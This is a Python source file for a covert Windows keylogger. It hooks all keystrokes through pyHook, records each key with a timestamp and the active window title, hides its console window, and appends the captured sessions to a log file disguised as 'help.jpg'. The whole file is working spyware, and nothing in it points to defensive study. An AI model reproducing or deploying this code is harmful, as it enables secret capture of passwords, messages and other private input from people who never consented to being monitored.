import win32gui, win32console, pyHook, pythoncom
from datetime import datetime 

# Global variable to store window name
winName = ''
#Global variable array for dictionary of logged data
keyLst = []

#Log file path with obscure name
flePath = 'help.jpg' 

#Write session every x characters 
wrtCount = 512 

#Track keypress count
keyCount = 0
 
def hideWindow():
    #Get handle to console window 
    window = win32console.GetConsoleWindow()
    #Set the window to not visible 
    win32gui.ShowWindow(window,0)
    #return method
    return True
    
#Handle OnKetboardEvent hook event  
def OnKeyboardEvent(event):
    #global variablefor the active window string, keyLst array, keyCount
    global winName, keyLst, keyCount
    #Increment keyCount by 1 for checking against wrtCount 
    keyCount = keyCount +1 
    #Declare dictionary variable
    keyEnt={}
    #Populate dictionaryfields with respective values
    #Current time when key pressed
    keyEnt['time']=datetime.now()
    #Active window when key pressed
    keyEnt['window']=event.WindowName
    #key pressed 
    keyEnt['key']=event.Key
    
    #if winName is empty  
    if not winName:
        #Set current window name to global variable
        winName=event.WindowName
    #Check to see if the window name has changed or if we reached wrtCount limit
    #and write the session data to file 
    if winName != event.WindowName or keyCount>= wrtCount:
        #session end, call writeSession() method to write data to disk
        writeSession(keyLst)
        #Reset keyCount for new session
        keyCount=0
        #Reset keyLst array for new session
        keyLst=[]
        #set current active window 
        winName=event.WindowName
    #Add key data (dictionary object) and insert into keyLst array
    keyLst.append(keyEnt)
    #Return true to allow other handlers to process event 
    return True 
    
#Method used to write session data to disk 
def writeSession(lst):
    #Declare array count 
    cnt=len(lst) 
    #Declare session string variableand populate with start of session line 
    #This includes the time the session started and the active window name 
    strLog = '\n' + str(lst[0]['time']) + '[' + lst[0]['window'] + ']: Start\n'
    #For loop through Lst array of dictionary objects 
    for itm in lst:
        #display keys pressed from the array 
        #if key string lenghtis greater than 1 than the key is a Special key  
        if len(itm['key'])>1:
            #Add [] around Special key 
            itm['key']='['+ itm['key'] +']'
         #Append key to session string variable    
        strLog = strLog + str(itm['key'],)
    #append end of session data to session string variable
    #this include the time the session ended and the active window name
    strLog = strLog + str('\n' + str(lst[(cnt-1)]['time']) + '[' + str(lst[(cnt-1)]['window']) + ']: End \n\n',)
    #Open log file in append mode, write session data to file, and close the file 
    with open (flePath, 'a') as fle:
        fle.write(strLog)
    fle.close()
    #return method
    return True
    

#Create hook manager 
hook = pyHook.HookManager()
#Handle keyboard events from user defined method 
hook.KeyDown = OnKeyboardEvent
#Init the hook manager
hook.HookKeyboard()
#Hide window 
hideWindow()
#Get messages for the current thread until a WM_QUIT message.
pythoncom.PumpMessages()
    
                
 
    
 
